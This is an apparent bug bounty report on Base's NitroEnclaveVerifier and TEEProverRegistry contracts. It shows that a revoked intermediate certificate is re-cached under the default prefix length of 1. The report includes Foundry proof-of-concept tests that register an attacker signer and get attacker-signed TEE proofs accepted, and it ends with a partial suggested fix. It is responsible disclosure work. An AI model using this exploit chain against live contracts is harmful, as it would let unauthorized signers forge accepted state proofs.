# 75608 sc low production registrar s default trusted certs prefix 1 voids revokecert on the next routine signer registration attacker holding the revoked ca key registers a tee signer that&#x20;

**Report ID:** #75608\
**Report Type:** Smart Contract\
**Report severity:** Low\
**Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof\\>
**Impacts:**

* Registering a malicious or unauthorized TEE enclave signer in the TEEProverRegistry without valid attestation (PCR0 mismatch or missing attestation)

## Description

## Distinction from Cantina TEE Audit 2 Finding #5

Cantina #5 (verbatim recommendation): *"Trusted certificates can only be added by a trusted party, this reduces the impact of this issue. Consider adding comments to mention the fact that revoked certificates can be trusted again."* Severity: Informational. Team's only response: a single NatSpec line at `NitroEnclaveVerifier.sol:345` via PR-251.

The new material in this report:

* **Production hardcodes the bypass-shaped prefix-len.** `base/bin/prover-registrar/src/cli.rs:44` defines `DEFAULT_TRUSTED_CERTS_PREFIX: u8 = 1`, used unmodified at `cli.rs:509,522`. Every registrar-produced attestation carries `journal.trustedCertsPrefixLen = 1`. Pass 1 of `_verifyJournal` therefore only checks the root; every Nitro intermediate is in the suffix; `_cacheNewCert` rewrites every intermediate's storage entry on every successful verification. The "trusted party" Cantina relied on for mitigation is the registrar -- the same component whose default config produces the bypass-shaped journal.
* **Off-chain registrar does not consult on-chain revocation state.** `base/crates/proof/tee/registrar/src/driver.rs:404-435` checks AWS-published CRLs only, fail-open on errors. It does not read `NitroEnclaveVerifier.trustedIntermediateCerts`. `revokeCert` exists for the case where the operator suspects compromise before AWS publishes; in that interval the registrar continues forwarding registrations through the suspect CA, every one of which restores the cache.
* **End-to-end chain to a registered TEE signer.** With the revoked CA key, an attacker mints a leaf for an attacker-controlled keypair, runs the open-source enclave image (PCR0 deterministic), and submits via the registrar. After cache restore + signer registration, `signerImageHash[attacker] == TEE_IMAGE_HASH`. `TEEVerifier.verify` admits proofs signed by the attacker's key (subject to the proposer gate); `AggregateVerifier._verifyTeeProof` admits them via the same `TEEVerifier.verify` call path. The PoC drives this end-to-end through `registerSigner` and `TEEVerifier.verify`.

Per Immunefi's known-issue rules: "*Simply recognizing an attack vector or a general risk does not qualify as knowing the issue; both the exploit method and its impact must be fully understood*" -- Cantina recognized the vector and bounded the impact via a mitigation the production code does not implement. "*If the issue was known but not acted upon ... the submission may still be eligible*" -- the team's only action on Cantina #5 was a one-line NatSpec; no code remediation. "*Different execution methods or new insights can make it a distinct issue*" -- the production-default prefix-len, the registrar's CRL-only filtering posture, and the chain to accepted TEE proofs are new material.

## Vulnerability Details

`_verifyJournal` (`NitroEnclaveVerifier.sol:597`) splits chain validation into two passes:

```solidity
// Pass 1 -- only iterates indices < trustedCertsPrefixLen, checks on-chain trust
for (uint256 i = 0; i < journal.trustedCertsPrefixLen; i++) {
    bytes32 certHash = journal.certs[i];
    if (i == 0) {
        if (certHash != rootCert) {
            journal.result = VerificationResult.RootCertNotTrusted;
            return journal;
        }
        continue;
    }
    uint64 expiry = trustedIntermediateCerts[certHash];                  // line 615
    if (block.timestamp > expiry) {
        journal.result = VerificationResult.IntermediateCertsNotTrusted;
        return journal;
    }
}
// Pass 2 -- only the journal-supplied expiry, never storage
for (uint256 i = journal.trustedCertsPrefixLen; i < journal.certs.length; i++) {
    uint64 expiry = journal.certExpiries[i];                             // line 623
    if (block.timestamp > expiry) {
        journal.result = VerificationResult.InvalidTimestamp;
        return journal;
    }
}
// Timestamp checks omitted; on success, _cacheNewCert is invoked.
_cacheNewCert(journal);                                                  // line 634
```

`_cacheNewCert` (`NitroEnclaveVerifier.sol:574`):

```solidity
function _cacheNewCert(VerifierJournal memory journal) internal {
    for (uint256 i = journal.trustedCertsPrefixLen; i < journal.certs.length; i++) {
        bytes32 certHash = journal.certs[i];
        trustedIntermediateCerts[certHash] = journal.certExpiries[i];   // unconditional rewrite
    }
}
```

`revokeCert` (`NitroEnclaveVerifier.sol:347-353`) zeros the storage entry. With `trustedCertsPrefixLen = 1`, Pass 1 only checks the root and skips every intermediate; Pass 2 reads journal-supplied expiries; `_cacheNewCert` rewrites every intermediate's `trustedIntermediateCerts` entry to `journal.certExpiries[i]`. There is no on-chain state distinguishing "previously revoked" from "never seen". Mainnet relevance: `DEFAULT_TRUSTED_CERTS_PREFIX = 1` is unoverrideable in the shipped registrar binary (no CLI flag, no config field, no network conditional). The prover-side type comment at `boundless.rs:75-76` documents the intent: *"Number of trusted certificates in the chain (typically 1 for root-only)."*

### Chain into a registered signer admitted by `AggregateVerifier`

`registerSigner` (`TEEProverRegistry.sol:145`) calls `NITRO_VERIFIER.verify`, then on `Success` records `isRegisteredSigner[enclaveAddress] = true` (line 170) and `signerImageHash[enclaveAddress] = pcr0Hash` (line 171). `TEEVerifier.verify` (`TEEVerifier.sol:81,86,94`) admits proofs when proposer, registered-signer, and image-hash gates all pass. `AggregateVerifier._verifyTeeProof` (`AggregateVerifier.sol:870-899`, `TEE_IMAGE_HASH` at line 893, `TEE_VERIFIER.verify(...)` at line 899) accepts the resulting TEE proof.

Attack chain after `revokeCert(C)`:

1. Attacker holds `C`'s private key (the premise of the threat that motivated the revocation).
2. Attacker mints a leaf cert under `C` for a keypair they control.
3. Attacker runs the open-source enclave image -- PCR0 deterministically equals the live `TEE_IMAGE_HASH`.
4. The Nitro attestation document carries `[root, C, attacker_leaf]`, attacker's leaf public key, and matching PCR0.
5. The off-chain prover (or the attacker simulating it) packages the attestation with `trustedCertsPrefixLen = 1` (the production default).
6. Manager forwards via `registerSigner`. `_verifyJournal` returns `Success`; `_cacheNewCert` rewrites `C`. `registerSigner` records the attacker's enclave address with `signerImageHash = TEE_IMAGE_HASH`.
7. The attacker's keypair signs TEE proofs that pass all three `TEEVerifier.verify` gates (proposer, registered-signer, image-hash). `AggregateVerifier._verifyTeeProof` (`AggregateVerifier.sol:870-899`) delegates to `TEE_VERIFIER.verify(...)` at line 899, so any proof admitted by `TEEVerifier.verify` is admitted by `AggregateVerifier`'s TEE path on the same journal.

### NatSpec note

`NitroEnclaveVerifier.sol:345`: *"A revoked cert can be trusted again by reproving it."* A literal reading -- any reproving rebuilds the cache, including reproving with the same compromised CA -- leaves `revokeCert` with no on-chain effect under the production prefix-len configuration. The function is `onlyOwnerOrRevoker`, emits a dedicated `CertRevoked` event, declares a dedicated `CertificateNotFound` error, and is the contract's only on-chain handle for responding to upstream-CA compromise. The narrower reading consistent with that surface -- re-trust applies after the upstream issue is resolved (e.g., AWS rotates the intermediate, attacker key recovered) -- is not enforced by the contract or the registrar.

## Impact

**Primary -- Tier B (High):** SC bracket *"Registering a malicious or unauthorized TEE enclave signer in the TEEProverRegistry without valid attestation (PCR0 mismatch or missing attestation)."* After `revokeCert(C)`, the registry has explicitly withdrawn its trust from chains anchored on `C`. An attestation traversing `C` is, per the registry's published on-chain trust state, an **unauthorized attestation** -- exactly the condition the High bracket targets. The bypass admits exactly such an attestation; the chain (PoC-verified) reaches `AggregateVerifier`-accepted TEE proofs signed by the actor `revokeCert` was deployed to lock out.

**Floor -- Tier A (Medium):** SC bracket *"Griefing that causes damage to users or the protocol without direct profit motive for the attacker."* The on-chain emergency primitive `revokeCert` has no durability under the production registrar configuration. No attacker key, no Base-infrastructure compromise: routine signer registration restores the cache.

### Downgrade clauses do not apply

Program scope applies two downgrade clauses to TEE-related reports. Neither lands cleanly here:

* *"Any report relying on an invalid TEE or ZK proof will be downgraded, especially TEE proofs unless it can be shown that a key compromise is unnecessary."* The Tier B PoC submits a **cryptographically valid** Nitro attestation: AWS root signs the intermediate, the (revoked) intermediate signs the attacker's leaf, the leaf attests a real PCR0 measured by an actual enclave running the open-source image. No signature is invalid; no PCR0 is missing or mismatched. The bug is not that an invalid proof is accepted -- the bug is that a **valid proof under an explicitly-revoked CA** is accepted, contradicting the on-chain trust state. The clause's qualifier ("unless it can be shown that a key compromise is unnecessary") also rules out automatic downgrade: Tier A demonstrates the on-chain effect with no attacker key.
* *"Downgrade valid reports if the attack requires compromising Base-operated infrastructure."* The Tier B chain does not require compromising Base's registrar, sequencer, or any Base-operated key. It requires the attacker to obtain the revoked CA's key -- which is the **premise that motivates `revokeCert` in the first place**. `revokeCert` is the on-chain incident-response primitive for upstream-CA compromise; reports that demonstrate its bypass under exactly the threat model it was designed for cannot be downgraded by appealing to that same threat model. Routine target-group enrollment for an attacker-run enclave is also operationally plausible without Base-side compromise (any AWS Nitro instance under the still-valid intermediate that the operator's discovery layer accepts).

The High bracket text reads "*Registering a malicious or unauthorized TEE enclave signer in the TEEProverRegistry without valid attestation (PCR0 mismatch or missing attestation).*" The parenthetical is illustrative, not exhaustive -- the load-bearing qualifier is *"without valid attestation"*. Under the registry's own published trust state (`revokeCert(C)`), an attestation through `C` is **not valid for registry trust purposes**.

## References

* `base/bin/prover-registrar/src/cli.rs:44,509,522` -- `DEFAULT_TRUSTED_CERTS_PREFIX = 1`, hardcoded.
* `base/crates/proof/tee/nitro-attestation-prover/src/boundless.rs:75-76,276`, `direct.rs:66` -- prover plumbs prefix-len into `journal.trustedCertsPrefixLen`.
* `base/crates/proof/tee/registrar/src/driver.rs:404-435` -- registrar's CRL check (AWS-only, fail-open, no on-chain consultation).
* `contracts/src/multiproof/tee/NitroEnclaveVerifier.sol:347-353` -- `revokeCert`.
* `contracts/src/multiproof/tee/NitroEnclaveVerifier.sol:574-579` -- `_cacheNewCert` (unconditional overwrite past prefix).
* `contracts/src/multiproof/tee/NitroEnclaveVerifier.sol:597-636` -- `_verifyJournal`: Pass 1 (606-620), Pass 2 (622-628).
* `contracts/src/multiproof/tee/NitroEnclaveVerifier.sol:345` -- NatSpec note added in PR-251.
* `contracts/src/multiproof/tee/NitroEnclaveVerifier.sol:487` -- `verify` `proofSubmitter` gate.
* `contracts/interfaces/multiproof/tee/INitroEnclaveVerifier.sol:56` -- `VerifierJournal.trustedCertsPrefixLen`.
* `contracts/src/multiproof/tee/TEEProverRegistry.sol:145,170,171` -- `registerSigner` writes `isRegisteredSigner`, `signerImageHash`.
* `contracts/src/multiproof/tee/TEEVerifier.sol:81,86,94` -- proposer / registered-signer / image-hash gates.
* `contracts/src/multiproof/AggregateVerifier.sol:870-899` -- `_verifyTeeProof`; `TEE_VERIFIER.verify(...)` at line 899.
* `contract-deployments/sepolia/2026-04-20-activate-multiproof/script/SetupNitroEnclaveVerifier.s.sol:39-41` -- Sepolia wires `proofSubmitter` to the registry proxy.

Cited line numbers from local snapshots: `contracts` at commit `01dad23` (tag `v8.1.0`), `base` at `v0.8.0-rc.28`.

## Proof of Concept

Three Foundry tests across two files, fully inlined below. Mocking is limited to `IRiscZeroVerifier` (the off-chain ZK verifier; the defect lives in the Solidity trust-cache transition). Tier B lives in a separate file because `TEEProverRegistry` pins source pragma `=0.8.15` while `NitroEnclaveVerifier` transitively requires `>=0.8.20` via `ISP1Verifier`; no single source pragma satisfies both, so the Tier B file deploys `NitroEnclaveVerifier` from artifact bytecode via `vm.deployCode` and interacts via a minimal interface.

### Tier A -- `contracts/test/multiproof/NitroRevocationBypass.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";

import {
    ZkCoProcessorType,
    ZkCoProcessorConfig,
    VerifierJournal,
    VerificationResult,
    Pcr
} from "interfaces/multiproof/tee/INitroEnclaveVerifier.sol";

import { NitroEnclaveVerifier } from "src/multiproof/tee/NitroEnclaveVerifier.sol";

contract NitroRevocationBypassTest is Test {
    NitroEnclaveVerifier public verifier;

    address public owner;
    address public submitter;
    address public revokerAddr;
    address public mockRiscZeroVerifier;

    bytes32 public constant ROOT_CERT = keccak256("root-cert");
    bytes32 public constant CERT_INTER = keccak256("intermediate-cert-compromised");
    bytes32 public constant CERT_LEAF = keccak256("leaf-cert-attacker");
    bytes32 public constant VERIFIER_ID = keccak256("verifier-id");
    bytes32 public constant AGGREGATOR_ID = keccak256("aggregator-id");
    bytes32 public constant VERIFIER_PROOF_ID = keccak256("verifier-proof-id");

    uint64 public constant MAX_TIME_DIFF = 3600;
    uint256 internal constant T0 = 1_700_000_000;
    uint64 internal constant CERT_INTER_NATURAL_EXPIRY = 1_800_000_000;
    uint64 internal constant LEAF_NATURAL_EXPIRY = 1_700_100_000;

    function setUp() public {
        vm.warp(T0);
        owner = address(this);
        submitter = makeAddr("submitter");
        revokerAddr = makeAddr("revoker");
        mockRiscZeroVerifier = makeAddr("mock-riscZero-verifier");

        // CERT_INTER starts trusted with a far-future natural expiry -- i.e., it would
        // legitimately appear in chains until either AWS rotates it or the operator revokes.
        bytes32[] memory trustedCerts = new bytes32[](1);
        trustedCerts[0] = CERT_INTER;
        uint64[] memory trustedCertExpiries = new uint64[](1);
        trustedCertExpiries[0] = CERT_INTER_NATURAL_EXPIRY;

        ZkCoProcessorConfig memory zkCfg = ZkCoProcessorConfig({
            verifierId: VERIFIER_ID, aggregatorId: AGGREGATOR_ID, zkVerifier: mockRiscZeroVerifier
        });

        verifier = new NitroEnclaveVerifier(
            owner, MAX_TIME_DIFF, trustedCerts, trustedCertExpiries,
            ROOT_CERT, submitter, revokerAddr,
            ZkCoProcessorType.RiscZero, zkCfg, VERIFIER_PROOF_ID
        );
    }

    /// Demonstrates the bypass: revokeCert(C) + verify(prefixLen=1) restores C in the cache.
    function testTierA_RevocationRewrittenAtProductionPrefixLen() public {
        // Step 1: operator detects compromise and revokes the intermediate CA.
        vm.prank(revokerAddr);
        verifier.revokeCert(CERT_INTER);
        assertEq(verifier.trustedIntermediateCerts(CERT_INTER), 0, "post-revoke: zero");

        // Step 2: an attestation arrives carrying the production-default prefix-len = 1
        // (see base/bin/prover-registrar/src/cli.rs:44). The chain is [root, CERT_INTER, leaf];
        // CERT_INTER lives in the suffix, beyond Pass 1's iteration bound.
        VerifierJournal memory journal = _craftJournal(); // prefixLen=1
        bytes memory output = abi.encode(journal);
        bytes memory proofBytes = abi.encodePacked(bytes4(0), bytes32(0));
        _mockRiscZeroVerify(VERIFIER_ID, output, proofBytes); // ZK verify mocked: signatures valid

        // Step 3: the proofSubmitter forwards the attestation. Pass 1 only checks the root;
        // Pass 2 reads journal-supplied (future) expiries; _cacheNewCert rewrites the suffix
        // unconditionally. The revoked entry is restored.
        vm.prank(submitter);
        VerifierJournal memory result = verifier.verify(output, ZkCoProcessorType.RiscZero, proofBytes);

        assertEq(uint8(result.result), uint8(VerificationResult.Success), "verify should return Success");
        assertEq(
            verifier.trustedIntermediateCerts(CERT_INTER),
            CERT_INTER_NATURAL_EXPIRY,
            "Tier A: revoked cert restored to the trusted set"
        );

        // Sanity: from the helper's perspective, the chain is fully trusted again at depth 3.
        bytes32[][] memory reportCerts = new bytes32[][](1);
        reportCerts[0] = new bytes32[](3);
        reportCerts[0][0] = ROOT_CERT;
        reportCerts[0][1] = CERT_INTER;
        reportCerts[0][2] = CERT_LEAF;
        uint8[] memory trustedLens = verifier.checkTrustedIntermediateCerts(reportCerts);
        assertEq(trustedLens[0], 3, "checkTrustedIntermediateCerts treats the chain as fully trusted again");
    }

    /// Control case: when a journal places the revoked cert in the trusted prefix
    /// (prefixLen >= 2), Pass 1 catches it. Confirms Pass 1 is the only on-chain
    /// enforcement, and the production prefix-len = 1 silently elides it.
    function testTierA_RevocationCorrectlyEnforcedAtNormalPrefixLen() public {
        vm.prank(revokerAddr);
        verifier.revokeCert(CERT_INTER);

        VerifierJournal memory journal = _craftJournal();
        journal.trustedCertsPrefixLen = 2;
        bytes memory output = abi.encode(journal);
        bytes memory proofBytes = abi.encodePacked(bytes4(0), bytes32(0));
        _mockRiscZeroVerify(VERIFIER_ID, output, proofBytes);

        vm.prank(submitter);
        VerifierJournal memory result = verifier.verify(output, ZkCoProcessorType.RiscZero, proofBytes);

        assertEq(
            uint8(result.result),
            uint8(VerificationResult.IntermediateCertsNotTrusted),
            "Pass 1 catches the revoked cert when it is in the trusted prefix"
        );
        assertEq(verifier.trustedIntermediateCerts(CERT_INTER), 0, "control: cert stays revoked");
    }

    /// Builds the journal: 3-cert chain, prefixLen=1 (production default), future expiries.
    function _craftJournal() internal view returns (VerifierJournal memory) {
        bytes32[] memory certs = new bytes32[](3);
        certs[0] = ROOT_CERT;
        certs[1] = CERT_INTER;
        certs[2] = CERT_LEAF;

        uint64[] memory expiries = new uint64[](3);
        expiries[0] = CERT_INTER_NATURAL_EXPIRY + 100_000_000;
        expiries[1] = CERT_INTER_NATURAL_EXPIRY;
        expiries[2] = LEAF_NATURAL_EXPIRY;

        Pcr[] memory pcrs = new Pcr[](0);

        return VerifierJournal({
            result: VerificationResult.Success,
            trustedCertsPrefixLen: 1, // production default -- only the root is in the trusted prefix
            timestamp: uint64(block.timestamp - 1) * 1000,
            certs: certs, certExpiries: expiries,
            userData: "", nonce: "", publicKey: "",
            pcrs: pcrs,
            moduleId: "compromised-attestation"
        });
    }

    /// Mocks IRiscZeroVerifier.verify to return success -- the bug lives in Solidity
    /// trust-cache logic, not in ZK verification of the cert chain's signatures.
    function _mockRiscZeroVerify(bytes32 programId, bytes memory output, bytes memory proofBytes) internal {
        vm.mockCall(
            mockRiscZeroVerifier,
            abi.encodeWithSelector(
                bytes4(keccak256("verify(bytes,bytes32,bytes32)")), proofBytes, programId, sha256(output)
            ),
            ""
        );
    }
}
```

### Tier B -- `contracts/test/multiproof/NitroRevocationBypassTierB.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { Test } from "forge-std/Test.sol";

import { TransparentUpgradeableProxy } from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import { ProxyAdmin } from "src/universal/ProxyAdmin.sol";

import {
    INitroEnclaveVerifier,
    ZkCoProcessorType,
    ZkCoProcessorConfig,
    VerifierJournal,
    VerificationResult,
    Pcr,
    Bytes48
} from "interfaces/multiproof/tee/INitroEnclaveVerifier.sol";
import { IDisputeGameFactory } from "interfaces/dispute/IDisputeGameFactory.sol";
import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { GameType } from "src/dispute/lib/Types.sol";

import { TEEProverRegistry } from "src/multiproof/tee/TEEProverRegistry.sol";
import { TEEVerifier } from "src/multiproof/tee/TEEVerifier.sol";

/// Returns a fixed TEE_IMAGE_HASH so the registry's _getExpectedImageHash lookup works.
contract MockAggregateVerifierForBypass {
    bytes32 public TEE_IMAGE_HASH;
    constructor(bytes32 imageHash) { TEE_IMAGE_HASH = imageHash; }
}

/// Returns a fixed game implementation so TEEProverRegistry._getExpectedImageHash resolves.
contract MockDisputeGameFactoryForBypass {
    mapping(uint32 => address) internal _impls;
    function setImpl(uint32 gameType_, address impl) external { _impls[gameType_] = impl; }
    function gameImpls(GameType gameType_) external view returns (IDisputeGame) {
        return IDisputeGame(_impls[GameType.unwrap(gameType_)]);
    }
}

/// Minimal interface used to call the deployed NitroEnclaveVerifier via vm.deployCode.
/// Pragma-conflict workaround: ISP1Verifier requires ^0.8.20, TEEProverRegistry pins =0.8.15.
interface INitroEnclaveVerifierTest {
    function setProofSubmitter(address submitter) external;
    function revokeCert(bytes32 certHash) external;
    function trustedIntermediateCerts(bytes32) external view returns (uint64);
}

contract NitroRevocationBypassTierBTest is Test {
    address internal verifierAddr; // NitroEnclaveVerifier deployed via vm.deployCode

    address public owner;
    address public revokerAddr;
    address public managerAddr;
    address public mockRiscZeroVerifier;

    bytes32 public constant ROOT_CERT = keccak256("root-cert");
    bytes32 public constant CERT_INTER = keccak256("intermediate-cert-compromised");
    bytes32 public constant CERT_LEAF = keccak256("leaf-cert-attacker");
    bytes32 public constant VERIFIER_ID = keccak256("verifier-id");
    bytes32 public constant AGGREGATOR_ID = keccak256("aggregator-id");
    bytes32 public constant VERIFIER_PROOF_ID = keccak256("verifier-proof-id");

    uint64 public constant MAX_TIME_DIFF = 3600;
    uint256 internal constant T0 = 1_700_000_000;
    uint64 internal constant CERT_INTER_NATURAL_EXPIRY = 1_800_000_000;
    uint64 internal constant LEAF_NATURAL_EXPIRY = 1_700_100_000;
    uint32 internal constant TEST_GAME_TYPE = 621;

    /// Anvil account 0; uncompressed pubkey is the public counterpart.
    /// keccak256(abi.encodePacked(ATTACKER_PUB_X, ATTACKER_PUB_Y))[12:32] == vm.addr(ATTACKER_PRIV).
    uint256 internal constant ATTACKER_PRIV =
        0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    bytes32 internal constant ATTACKER_PUB_X =
        0x8318535b54105d4a7aae60c08fc45f9687181b4fdfc625bd1a753fa7397fed75;
    bytes32 internal constant ATTACKER_PUB_Y =
        0x3547f11ca8696646f2f3acb08e31016afac23e630c5d11f59f61fef57b0d2aa5;

    /// PCR0 split into Bytes48; LIVE_IMAGE := keccak256(first || second).
    /// Matches the on-chain image-hash check in TEEProverRegistry._extractPCR0Hash + TEEVerifier.
    bytes32 internal constant PCR0_FIRST =
        0x1111111111111111111111111111111111111111111111111111111111111111;
    bytes16 internal constant PCR0_SECOND = 0x22222222222222222222222222222222;

    function setUp() public {
        vm.warp(T0);
        owner = address(this);
        revokerAddr = makeAddr("revoker");
        managerAddr = makeAddr("manager");
        mockRiscZeroVerifier = makeAddr("mock-riscZero-verifier");

        bytes32[] memory trustedCerts = new bytes32[](1);
        trustedCerts[0] = CERT_INTER;
        uint64[] memory trustedCertExpiries = new uint64[](1);
        trustedCertExpiries[0] = CERT_INTER_NATURAL_EXPIRY;

        ZkCoProcessorConfig memory zkCfg = ZkCoProcessorConfig({
            verifierId: VERIFIER_ID, aggregatorId: AGGREGATOR_ID, zkVerifier: mockRiscZeroVerifier
        });

        // Deploy NitroEnclaveVerifier from artifact bytecode (pragma-conflict workaround).
        bytes memory args = abi.encode(
            owner, MAX_TIME_DIFF, trustedCerts, trustedCertExpiries,
            ROOT_CERT, address(0xdEaD), revokerAddr, // proofSubmitter overwritten below
            ZkCoProcessorType.RiscZero, zkCfg, VERIFIER_PROOF_ID
        );
        verifierAddr = deployCode("NitroEnclaveVerifier.sol:NitroEnclaveVerifier", args);
    }

    /// Holds the deployed system addresses to keep the test-body local count low.
    struct Sys {
        TEEProverRegistry registry;
        TEEVerifier teeVerifier;
        bytes32 liveImage;
        address proposerAddr;
    }

    function testTierB_AttackerSignerAdmittedAndProducesAcceptedTEEProof() public {
        Sys memory sys = _deploySystem();

        // 1. Operator detects compromise of CERT_INTER and revokes on-chain.
        vm.prank(revokerAddr);
        INitroEnclaveVerifierTest(verifierAddr).revokeCert(CERT_INTER);
        assertEq(
            INitroEnclaveVerifierTest(verifierAddr).trustedIntermediateCerts(CERT_INTER), 0, "post-revoke: zero"
        );

        // 2. Manager forwards an attacker-controlled, verifier-accepted journal whose chain
        //    traverses the just-revoked CERT_INTER. After cache restore, registerSigner
        //    records the attacker's enclave address with signerImageHash = LIVE_IMAGE.
        address attackerAddr = vm.addr(ATTACKER_PRIV);
        _registerAttacker(sys.registry);

        // 3. Registry state confirms the attacker is now a registered signer at the live
        //    image hash; the revoked cert is restored as a side effect of the registration.
        assertTrue(sys.registry.isRegisteredSigner(attackerAddr), "attacker registered as signer");
        assertEq(sys.registry.signerImageHash(attackerAddr), sys.liveImage, "signer image hash matches live");
        assertEq(
            INitroEnclaveVerifierTest(verifierAddr).trustedIntermediateCerts(CERT_INTER),
            CERT_INTER_NATURAL_EXPIRY,
            "revoked cert restored as side effect of registration"
        );

        // 4. Attacker-signed TEE proof is admitted by TEEVerifier.verify -- proposer,
        //    registered-signer, and image-hash gates all pass. AggregateVerifier delegates
        //    to TEE_VERIFIER.verify on the same journal, so the same proof is admitted there.
        bool ok = _attackerSignedProofVerifies(sys);
        assertTrue(ok, "TEEVerifier admits attacker-signed proof");
    }

    /// Deploys the test rig: mock factory + AggregateVerifier-like contract (returns
    /// LIVE_IMAGE), real TEEProverRegistry (proxy + initialize), real TEEVerifier; sets
    /// the registry as the verifier's proofSubmitter and registers a valid proposer.
    function _deploySystem() internal returns (Sys memory sys) {
        sys.liveImage = keccak256(abi.encodePacked(PCR0_FIRST, PCR0_SECOND));

        MockAggregateVerifierForBypass mockAgg = new MockAggregateVerifierForBypass(sys.liveImage);
        MockDisputeGameFactoryForBypass mockFactory = new MockDisputeGameFactoryForBypass();
        mockFactory.setImpl(TEST_GAME_TYPE, address(mockAgg));

        TEEProverRegistry impl = new TEEProverRegistry(
            INitroEnclaveVerifier(verifierAddr), IDisputeGameFactory(address(mockFactory))
        );
        ProxyAdmin proxyAdmin = new ProxyAdmin(address(this));
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            address(impl),
            address(proxyAdmin),
            abi.encodeCall(
                TEEProverRegistry.initialize,
                (owner, managerAddr, new address[](0), GameType.wrap(TEST_GAME_TYPE))
            )
        );
        sys.registry = TEEProverRegistry(address(proxy));

        // proofSubmitter on the verifier is the registry -- the production submission path.
        INitroEnclaveVerifierTest(verifierAddr).setProofSubmitter(address(sys.registry));

        sys.teeVerifier =
            new TEEVerifier(TEEProverRegistry(address(sys.registry)), IAnchorStateRegistry(address(0)));

        sys.proposerAddr = makeAddr("proposer");
        sys.registry.setProposer(sys.proposerAddr, true);
    }

    /// Constructs the attacker-controlled journal (chain=[root, CERT_INTER, leaf for
    /// attacker keypair issued under revoked CERT_INTER], PCR0 hashes to LIVE_IMAGE,
    /// prefixLen=1 production default), mocks IRiscZeroVerifier, calls registerSigner.
    function _registerAttacker(TEEProverRegistry registry) internal {
        // Sanity check: the pubkey-to-address derivation that registerSigner uses.
        assertEq(
            address(uint160(uint256(keccak256(abi.encodePacked(ATTACKER_PUB_X, ATTACKER_PUB_Y))))),
            vm.addr(ATTACKER_PRIV),
            "uncompressed pubkey hashes to attacker address"
        );

        bytes memory attackerPubkey = abi.encodePacked(bytes1(0x04), ATTACKER_PUB_X, ATTACKER_PUB_Y);
        Pcr[] memory pcrs = new Pcr[](1);
        pcrs[0] = Pcr({ index: 0, value: Bytes48({ first: PCR0_FIRST, second: PCR0_SECOND }) });
        VerifierJournal memory journal = _craftJournal(attackerPubkey, pcrs);

        bytes memory output = abi.encode(journal);
        bytes memory proofBytes = abi.encodePacked(bytes4(0), bytes32(0));
        _mockRiscZeroVerify(VERIFIER_ID, output, proofBytes);

        vm.prank(managerAddr);
        registry.registerSigner(output, proofBytes);
    }

    /// Signs an attacker-chosen 32-byte journal hash with ATTACKER_PRIV and packs the
    /// 85-byte proof = proposer(20) || r(32) || s(32) || v(1). TEEVerifier.verify checks
    /// proposer, registered-signer, image-hash; all three pass after _registerAttacker.
    function _attackerSignedProofVerifies(Sys memory sys) internal view returns (bool) {
        bytes32 chosenJournal = keccak256("attacker-chosen-state");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ATTACKER_PRIV, chosenJournal);
        bytes memory teeProof = abi.encodePacked(sys.proposerAddr, abi.encodePacked(r, s, v));
        return sys.teeVerifier.verify(teeProof, sys.liveImage, chosenJournal);
    }

    function _craftJournal(bytes memory publicKey_, Pcr[] memory pcrs)
        internal view returns (VerifierJournal memory)
    {
        bytes32[] memory certs = new bytes32[](3);
        certs[0] = ROOT_CERT;
        certs[1] = CERT_INTER;
        certs[2] = CERT_LEAF;

        uint64[] memory expiries = new uint64[](3);
        expiries[0] = CERT_INTER_NATURAL_EXPIRY + 100_000_000;
        expiries[1] = CERT_INTER_NATURAL_EXPIRY;
        expiries[2] = LEAF_NATURAL_EXPIRY;

        return VerifierJournal({
            result: VerificationResult.Success,
            trustedCertsPrefixLen: 1, // production default -- the bypass-shaped journal
            timestamp: uint64(block.timestamp - 1) * 1000,
            certs: certs, certExpiries: expiries,
            userData: "", nonce: "", publicKey: publicKey_,
            pcrs: pcrs,
            moduleId: "compromised-attestation"
        });
    }

    function _mockRiscZeroVerify(bytes32 programId, bytes memory output, bytes memory proofBytes) internal {
        vm.mockCall(
            mockRiscZeroVerifier,
            abi.encodeWithSelector(
                bytes4(keccak256("verify(bytes,bytes32,bytes32)")), proofBytes, programId, sha256(output)
            ),
            ""
        );
    }
}
```

### How to run

```bash
cd contracts
make deps
forge test --match-path "test/multiproof/NitroRevocationBypass*.t.sol" -vv
```

Run output:

```
Ran 2 tests for test/multiproof/NitroRevocationBypass.t.sol:NitroRevocationBypassTest
[PASS] testTierA_RevocationCorrectlyEnforcedAtNormalPrefixLen() (gas: 65987)
[PASS] testTierA_RevocationRewrittenAtProductionPrefixLen() (gas: 100470)

Ran 1 test for test/multiproof/NitroRevocationBypassTierB.t.sol:NitroRevocationBypassTierBTest
[PASS] testTierB_AttackerSignerAdmittedAndProducesAcceptedTEEProof() (gas: 4683747)

Ran 2 test suites: 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

## Suggested Fix

Maintain a separate revocation sentinel that survives `_cacheNewCert` overwrites and reject revoked hashes everywhere a cert is consulted. Diffs against the current `NitroEnclaveVerifier.sol`:

```solidity
// New storage:
mapping(bytes32 => bool) public revokedCerts;

// revokeCert: also flip the sentinel.
function revokeCert(bytes32 certHash) external onlyOwnerOrRevoker {
    if (trustedIntermediateCerts[certHash] == 0) {
        revert CertificateNotFound(certHash);
    }
    delete trustedIntermediateCerts[certHash];
    revokedCerts[certHash] = true;                                       // ADDED
    emit CertRevoked(certHash);
}

// _cacheNewCert: skip writes to revoked entries (do not re-cache a previously revoked CA).
function _cacheNewCert(VerifierJournal memory journal) internal {
    for (uint256 i = journal.trustedCertsPrefixLen; i < journal.certs.length; i++) {
        bytes32 certHash = journal.certs[i];
        if (revokedCerts[certHash]) continue;                            // ADDED
        trustedIntermediateCerts[certHash] = journal.certExpiries[i];
    }
}

// _verifyJournal Pass 2: reject when a suffix entry is in the revoked set, so a
// revoked cert in the suffix can no longer pass verification.
function _verifyJournal(VerifierJournal memory journal) internal returns (VerifierJournal memory) {
